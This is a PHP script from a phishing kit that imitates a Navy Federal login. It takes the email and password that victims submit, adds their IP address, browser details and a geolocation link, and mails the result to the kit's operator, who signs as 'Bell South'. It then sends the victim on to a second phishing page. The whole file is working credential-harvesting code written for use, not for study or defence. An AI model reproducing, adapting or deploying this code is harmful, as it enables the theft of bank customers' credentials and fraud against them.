<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->Navy Federal - ReZulT (3)<------------------\n";
$message .= "Email: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['Pass']."\n\n";

$message .= "Time: $timestamp \n";
$message .= "Browser: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -By Bell South - ICQ:@Bell_South----------\n";

$subject = "NavyFederal Email-1 (3)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "Bell South ReZulT ", $message);
if (mail($recipient,$subject,$message,$headers))
	   {

		   header("Location:email2.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?> 